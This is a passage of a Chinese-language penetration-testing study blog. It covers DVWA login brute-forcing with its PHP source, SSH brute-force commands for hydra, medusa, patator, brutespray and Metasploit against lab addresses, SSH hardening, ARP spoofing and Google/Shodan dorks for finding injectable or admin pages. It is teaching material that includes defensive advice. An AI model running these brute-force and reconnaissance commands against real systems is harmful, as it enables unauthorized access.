class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>; <span class="comment">// Bug fix.</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login Successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$avatar</span> . <span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p> mysqli_real_escape_string()会将转义特殊字符，一定程度上防止SQL注入。 所以用[低]的burpsuite方法解决。</p><h2 id="8-3-网页密码暴力破解-高"><a href="#8-3-网页密码暴力破解-高" class="headerlink" title="8.3 网页密码暴力破解[高]"></a>8.3 网页密码暴力破解[高]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$qry</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$qry</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>; <span class="comment">// Bug fix.</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login Successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$avatar</span> . <span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>还是可以用burpsuite解决，但每次登录失败都要sleep3秒，大大降低破解速度。</p><h2 id="8-4-SSH密码暴力破解"><a href="#8-4-SSH密码暴力破解" class="headerlink" title="8.4 SSH密码暴力破解"></a>8.4 SSH密码暴力破解</h2><h3 id="8-4-1-hydra"><a href="#8-4-1-hydra" class="headerlink" title="8.4.1 hydra"></a>8.4.1 hydra</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh -o ssh-hydra.ok</span><br></pre></td></tr></table></figure><h3 id="8-4-2-medusa"><a href="#8-4-2-medusa" class="headerlink" title="8.4.2 medusa"></a>8.4.2 medusa</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">速度快，支持大规模并行，模块化，爆破登录，可以同时对多个主机、用户或密码执行强力测试。medusa和hydra一样，同样属于在线密码破解工具。不同的是，medusa的稳定性相较于hydra要好很多，但其支持模块要比hydra少一些。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</span><br><span class="line"></span><br><span class="line">medusa -M ssh -H hostlist.txt -U userlist.txt -P passlist.txt -O ssh.log</span><br></pre></td></tr></table></figure><h3 id="8-4-3-patator"><a href="#8-4-3-patator" class="headerlink" title="8.4.3 patator"></a>8.4.3 patator</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patator ssh_login host=192.168.137.147 user=root password=FILE0 0=passlist.txt -x ignore:mesg=&#x27;Authentication failed&#x27;</span><br></pre></td></tr></table></figure><h3 id="8-4-5-brutespray"><a href="#8-4-5-brutespray" class="headerlink" title="8.4.5 brutespray"></a>8.4.5 brutespray</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brutepray是一款基于nmap扫描输出的gnmap/XML文件，自动调用medusa对服务进行爆破。</span><br></pre></td></tr></table></figure><p>kali安装brutespray</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install brutespray</span><br></pre></td></tr></table></figure><p>brutespray语法参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-f FILE, --file FILE  GNMAP, JSON or XML file to parse</span><br><span class="line">-o OUTPUT, --output OUTPUT</span><br><span class="line">                      Directory containing successful attempts</span><br><span class="line">-s SERVICE, --service SERVICE</span><br><span class="line">                      specify service to attack</span><br><span class="line">-t THREADS, --threads THREADS</span><br><span class="line">                      number of medusa threads</span><br><span class="line">-T HOSTS, --hosts HOSTS</span><br><span class="line">                      number of hosts to test concurrently</span><br><span class="line">-U USERLIST, --userlist USERLIST</span><br><span class="line">                      reference a custom username file</span><br><span class="line">-P PASSLIST, --passlist PASSLIST</span><br><span class="line">                      reference a custom password file</span><br><span class="line">-u USERNAME, --username USERNAME</span><br><span class="line">                      specify a single username</span><br><span class="line">-p PASSWORD, --password PASSWORD</span><br><span class="line">                      specify a single password</span><br><span class="line">-c, --continuous      keep brute-forcing after success</span><br><span class="line">-i, --interactive     interactive mode</span><br><span class="line">-m, --modules         dump a list of available modules to brute</span><br><span class="line">-q, --quiet           supress banner</span><br></pre></td></tr></table></figure><h3 id="8-4-6-msf"><a href="#8-4-6-msf" class="headerlink" title="8.4.6 msf"></a>8.4.6 msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metasploit framework是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试，shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的perl编程语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。</span><br></pre></td></tr></table></figure><h4 id="8-4-6-1-SSH模块"><a href="#8-4-6-1-SSH模块" class="headerlink" title="8.4.6.1. SSH模块"></a>8.4.6.1. SSH模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# msfconsole</span><br><span class="line">msf6 &gt; search ssh</span><br></pre></td></tr></table></figure><h4 id="8-4-6-2-SSH用户枚举"><a href="#8-4-6-2-SSH用户枚举" class="headerlink" title="8.4.6.2. SSH用户枚举"></a>8.4.6.2. SSH用户枚举</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_enumusers</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; set rhosts 192.168.137.147</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; set USER_FILE /root/userlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_enumusers) &gt; run</span><br></pre></td></tr></table></figure><h4 id="8-4-6-3-SSH版本探测"><a href="#8-4-6-3-SSH版本探测" class="headerlink" title="8.4.6.3. SSH版本探测"></a>8.4.6.3. SSH版本探测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.137.147</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_version) &gt; run</span><br></pre></td></tr></table></figure><h4 id="8-4-6-4-SSH暴力破解"><a href="#8-4-6-4-SSH暴力破解" class="headerlink" title="8.4.6.4. SSH暴力破解"></a>8.4.6.4. SSH暴力破解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.137.147</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USER_FILE /root/userlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/passlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br></pre></td></tr></table></figure><h3 id="8-4-7-burpsuite"><a href="#8-4-7-burpsuite" class="headerlink" title="8.4.7 burpsuite"></a>8.4.7 burpsuite</h3><p>8.1-8.3用的就是burpsuite暴力破解的例子。</p><h2 id="8-5-暴力破解防御"><a href="#8-5-暴力破解防御" class="headerlink" title="8.5 暴力破解防御"></a>8.5 暴力破解防御</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1.sueradd shell[推荐]</span><br><span class="line">useradd v5le0n9 -s /sbin/nologin</span><br><span class="line"></span><br><span class="line">2.密码的复杂性[推荐]</span><br><span class="line">字母大小写+数字+特殊字符+20位以上+定期更换</span><br><span class="line"></span><br><span class="line">3.修改默认端口[推荐]</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">port 22222</span><br><span class="line"></span><br><span class="line">4.限制登录的用户或组[推荐]</span><br><span class="line">#permitrootlogin yes</span><br><span class="line">allowusers v5le0n9</span><br><span class="line"></span><br><span class="line">man sshd_config</span><br><span class="line">allowusers allowgroups denyusers denygroups</span><br><span class="line"></span><br><span class="line">5.使用sudo，不用root用户[推荐]</span><br><span class="line"></span><br><span class="line">6.设置允许的IP访问[可选]</span><br><span class="line">/etc/hosts.alllow，例如sshd:192.168.137.147:allow</span><br><span class="line">PAM基于IP限制</span><br><span class="line">iptables/firewalld</span><br><span class="line">只能允许从堡垒机访问</span><br><span class="line"></span><br><span class="line">7.使用denyhosts自动统计，并将其加入到/etc/hosts.deny</span><br><span class="line"></span><br><span class="line">8.基于PAM实现登录限制[推荐]</span><br><span class="line">模块：pam_tally2.so</span><br><span class="line">功能：登录统计</span><br><span class="line">示例：实现防止对sshd暴力破解</span><br><span class="line">grep tally2 /etc/pam.d/sshd</span><br><span class="line">auth required pam_tally2.so deny=2 even_deny_root root_unlock_time=60 unlock_time=6</span><br><span class="line"></span><br><span class="line">9.禁用密码改用公钥方式认证</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line">passwordauthentication no</span><br><span class="line"></span><br><span class="line">10.保护shell导出会话文件[小心]</span><br><span class="line"></span><br><span class="line">11.GRUB加密[针对本地破解]</span><br></pre></td></tr></table></figure><h1 id="9-中间人攻击"><a href="#9-中间人攻击" class="headerlink" title="9. 中间人攻击"></a>9. 中间人攻击</h1><p>利用ARP，ARP是地址解析协议，将IP地址转化为MAC地址。</p><p>kali抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -nn arpand host 192.168.137.147 抓ARP协议包</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -G图形化</span><br></pre></td></tr></table></figure><p>使用静态IP/MAC防止中间人攻击(windows下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netsh i i show in查看本地网络IDX值</span><br><span class="line">netsh -c &quot;i i&quot; add ne idx值 192.168.137.147 00-aa-00-62-6-c6-09永久绑定</span><br><span class="line">arp -a查看是否绑定成功</span><br><span class="line">netch -c &quot;i i&quot; delete neighbors idx值删除绑定的IP/MAC</span><br></pre></td></tr></table></figure><p>Linux下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -s 192.168.137.147 00-aa-00-62-6-c6-09</span><br></pre></td></tr></table></figure><h1 id="10-WEB信息收集"><a href="#10-WEB信息收集" class="headerlink" title="10. WEB信息收集"></a>10. WEB信息收集</h1><h2 id="10-1-网络信息收集的内容"><a href="#10-1-网络信息收集的内容" class="headerlink" title="10.1 网络信息收集的内容"></a>10.1 网络信息收集的内容</h2><h3 id="10-1-1-网络攻击信息收集"><a href="#10-1-1-网络攻击信息收集" class="headerlink" title="10.1.1. 网络攻击信息收集"></a>10.1.1. 网络攻击信息收集</h3><p>入手点：目标的名称和域名</p><p>攻击准备阶段：</p><ul><li>在网络中的“地理位置”</li><li>与真实世界的联系(实施社工和物理攻击)</li><li>“网络地图”</li><li>攻击所需的更详细信息</li></ul><p>攻击实施阶段：</p><ul><li>目标系统中存在的安全缺陷和漏洞</li><li>目标系统的安全防护机制</li></ul><h3 id="10-1-2-网络防御信息收集"><a href="#10-1-2-网络防御信息收集" class="headerlink" title="10.1.2. 网络防御信息收集"></a>10.1.2. 网络防御信息收集</h3><p>追查入侵者的身份、网络位置、所攻击的目标、采用的攻击方法等</p><p>一般被归入取证与追踪技术范畴</p><h2 id="10-2-信息收集的方式"><a href="#10-2-信息收集的方式" class="headerlink" title="10.2 信息收集的方式"></a>10.2 信息收集的方式</h2><ol><li>主动信息收集</li></ol><ul><li>通过直接访问、扫描网站，这种流量将流经网站。</li><li>能获取更多的信息， 但目标主机可能会记录操作记录。</li></ul><ol><li>被动信息收集</li></ol><ul><li>利用第三方的服务对目标进行访问了解，如搜索引擎等。</li><li>收集的信息会相对较少，但是行动并不会被目标主机发现。</li></ul><h2 id="10-3-信息收集的技术方法"><a href="#10-3-信息收集的技术方法" class="headerlink" title="10.3 信息收集的技术方法"></a>10.3 信息收集的技术方法</h2><script type="math/tex; mode=display">\begin{cases}踩点\begin{cases}Web搜索与挖掘\\DNS和IP查询\\网络拓扑和侦察\end{cases}\\扫描\begin{cases}主机扫描\\端口扫描\\系统类型探查\\漏洞扫描\end{cases}\\查点\begin{cases}旗标抓取\\网络服务查点\end{cases}\end{cases}</script><h3 id="10-3-1-网络踩点技术"><a href="#10-3-1-网络踩点技术" class="headerlink" title="10.3.1 网络踩点技术"></a>10.3.1 网络踩点技术</h3><h4 id="10-3-1-1-踩点"><a href="#10-3-1-1-踩点" class="headerlink" title="10.3.1.1. 踩点"></a>10.3.1.1. 踩点</h4><ul><li>有计划、有步骤的信息情报收集</li><li>了解攻击目标的网络环境和信息安全装库啊</li><li>得到攻击目标剖析图</li></ul><h4 id="10-3-1-2-踩点目的"><a href="#10-3-1-2-踩点目的" class="headerlink" title="10.3.1.2. 踩点目的"></a>10.3.1.2. 踩点目的</h4><ul><li>通过对完整剖析图的细致分析</li><li>攻击者将会从中寻找出攻击目标可能存在的薄弱环节</li><li>为进一步的攻击行动提供指引</li></ul><h4 id="10-3-1-3-踩点针对的信息"><a href="#10-3-1-3-踩点针对的信息" class="headerlink" title="10.3.1.3. 踩点针对的信息"></a>10.3.1.3. 踩点针对的信息</h4><h5 id="10-3-1-3-1-目标组织"><a href="#10-3-1-3-1-目标组织" class="headerlink" title="10.3.1.3.1 目标组织"></a>10.3.1.3.1 目标组织</h5><ul><li>具体使用的域名</li><li>网络地址范围</li><li>因特网上可直接访问的IP地址与网络服务</li><li>网络拓扑结构及软硬件</li><li>电话号码段</li><li>电子邮件列表</li><li>信息安全状况</li></ul><h5 id="10-3-1-3-2-目标个人"><a href="#10-3-1-3-2-目标个人" class="headerlink" title="10.3.1.3.2 目标个人"></a>10.3.1.3.2 目标个人</h5><ul><li>身份信息、联系方式、职业经历、甚至一些个人隐私信息</li></ul><h4 id="10-3-1-4-踩点技术手段"><a href="#10-3-1-4-踩点技术手段" class="headerlink" title="10.3.1.4. 踩点技术手段"></a>10.3.1.4. 踩点技术手段</h4><h5 id="10-3-1-4-1-Web信息搜索与挖掘"><a href="#10-3-1-4-1-Web信息搜索与挖掘" class="headerlink" title="10.3.1.4.1 Web信息搜索与挖掘"></a>10.3.1.4.1 Web信息搜索与挖掘</h5><p>对目标组织或个人的大量公开或意外泄漏的Web信息进行挖掘。</p><h6 id="10-3-1-4-1-1-Google-Hacking"><a href="#10-3-1-4-1-1-Google-Hacking" class="headerlink" title="10.3.1.4.1.1. Google Hacking"></a>10.3.1.4.1.1. Google Hacking</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#site</span><br><span class="line">功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。</span><br><span class="line">site:zhihu.com搜索跟zhihu.com相关的网页</span><br><span class="line">&quot;web安全&quot; site:zhihu.com搜索zhihu.com跟web安全相关的内容</span><br><span class="line">&quot;sql注入&quot; site:csdn.net在csdn.net搜索跟SQL注入相关的内容</span><br><span class="line">&quot;教程&quot; site:pan.baidu.com在百度盘搜索教程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#filetype</span><br><span class="line">功能：搜索指定文件类型</span><br><span class="line">&quot;web安全&quot; filetype:pdf搜索跟web安全有关的pdf文件</span><br><span class="line">namp filetype:ppt搜索跟nmap相关的ppt文件</span><br><span class="line">site:csdn.net filetype:pdf搜索csdn网站中的pdf文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#inurl</span><br><span class="line">功能：搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站</span><br><span class="line">inurl:.php?id=搜索网址中有&quot;.php?id=&quot;的网页</span><br><span class="line">inurl:view.php=?搜索网址中有&quot;view.php=?&quot;的网页</span><br><span class="line">inurl:.jsp?id=搜索网址中有&quot;.jsp?id=&quot;的网页</span><br><span class="line">inurl:.asp?id=搜索网址中有&quot;.asp?id=&quot;的网页</span><br><span class="line">inurl:/admin/login.php搜索网址中有&quot;/admin/login.php&quot;的网页</span><br><span class="line">inurl:login搜索网址中有&quot;login&quot;的登录网页</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#intitle</span><br><span class="line">功能：搜索标题存在特点关键字的网页</span><br><span class="line">intitle:后台登录搜索网页标题是&quot;后台登录&quot;的网页</span><br><span class="line">intitle:后台管理 filetype:php搜索网页标题是&quot;后台管理&quot;的php页面</span><br><span class="line">intitle:index of &quot;parent directory&quot;      搜索根目录相关的索引目录信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#intext</span><br><span class="line">功能：搜索正文存在特定关键字的网页</span><br><span class="line">intext:powered by Discuz搜索Discuz论坛相关的页面</span><br><span class="line">intext:powered by wordpress搜索wordpress制作的博客网址</span><br><span class="line">intext:powered by *CMS搜索基于*CMS的网址，CMS是内容管理系统，建站系统</span><br><span class="line">intext:powered by xxx inurl:login搜索此类网址的后台登录页面</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#符号</span><br><span class="line">-keyword强制结果不要出现此关键字，例如：电影 -黑客</span><br><span class="line">*keyword模糊搜索，强制结果包含此关键字，例如：电影 一个叫*决定*</span><br><span class="line">&quot;keyword&quot;强制搜索结果整体出现此关键字，例如：书籍 &quot;web安全&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#快捷键</span><br><span class="line">Ctrl + F想要在页面中查找某关键字的位置</span><br><span class="line">Ctrl + +/-/0放大、缩小页面，0是回到100%</span><br><span class="line">Ctrl + L选中页面中的地址栏</span><br><span class="line">Ctrl + Tab切换标签页</span><br><span class="line">Alt + Tab切换窗口</span><br></pre></td></tr></table></figure><p>例：搜纽约时报网站(nytimes.com)在2008年到2010年关于大学(college)测验分数(test scores)但不是SAT入学分数的文章。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:nytimes.com ~college &quot;test scores&quot; -SATs 2008..2010</span><br><span class="line">site:nytimes.com//只搜索某个网站的页面</span><br><span class="line">~college//同时搜索近义词比如university,higher education</span><br><span class="line">&quot;test scores&quot;//整体作为关键词</span><br><span class="line">-SATs//排除SATs</span><br><span class="line">2008..2010//显示指定年份时间段内的搜索结果</span><br></pre></td></tr></table></figure><h6 id="10-3-1-4-2-Shodan-Hacking"><a href="#10-3-1-4-2-Shodan-Hacking" class="headerlink" title="10.3.1.4.2. Shodan Hacking"></a>10.3.1.4.2. Shodan Hacking</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.shodan.io</span><br><span class="line">Shodan(撒旦搜索引擎)被称为“最可怕的搜索引擎”，可扫描一切联网的设备。除了常见的web服务器，还能扫描防火墙、路由器、交换机、摄像头、打印机等一切联网设备。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ip</span><br><span class="line">114.114.114.114</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#service/protocol</span><br><span class="line">http</span><br><span class="line">http country:&quot;DE&quot;使用高级搜索要注册登录才能搜索</span><br><span class="line">http product:&quot;Apache httpd&quot;</span><br><span 